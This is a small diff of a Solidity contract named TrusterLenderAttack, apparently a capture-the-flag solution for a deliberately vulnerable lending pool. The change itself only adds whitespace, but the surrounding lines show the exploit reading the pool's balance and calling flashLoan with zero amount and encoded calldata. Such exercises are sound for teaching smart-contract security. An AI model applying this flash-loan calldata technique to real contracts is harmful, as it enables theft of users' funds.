@@ -40,7 +40,7 @@ contract TrusterLenderAttack {
         // address attacker = msg.sender;
         uint balance = token.balanceOf(address(pool));
         pool.flashLoan(
-            0,
+            0, 
             msg.sender, // doesn't matter 
             address(token),
             abi.encodeWithSignature(
